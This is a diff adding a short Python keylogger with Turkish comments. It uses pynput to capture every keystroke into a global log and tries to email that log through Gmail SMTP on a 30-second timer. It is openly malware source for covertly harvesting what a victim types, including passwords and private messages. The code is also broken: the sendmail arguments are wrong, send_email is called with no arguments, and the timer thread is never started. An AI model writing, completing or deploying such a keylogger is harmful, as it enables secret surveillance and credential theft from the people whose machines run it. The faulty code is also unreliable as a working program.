@@ -1,0 +1,34 @@
+import pynput.keyboard
+import smtplib
+import threading
+log = ""
+def  callback_function(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError: #char olmayanlar için
+        if key ==key.space:
+            log = log+" "
+        else:
+            log = log+ str(key)
+    except:
+        pass
+
+    print(log)
+    #gmaille mail yollamak
+def send_email(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,password)
+    email_server.quit()
+send_email()
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) #dinleme satırı
+def thread_function():#While True çalışmıyor kilitlendiği için.
+    global log
+    send_email("email","parola",log.encode('utf-8'))
+    timer_object = threading.Timer(30,thread_function)
+    timer_object.start()
+#Threading (işlemcinin yaptığı işlemi nasıl yaptığı)
+with keylogger_listener:
+    keylogger_listener.join()
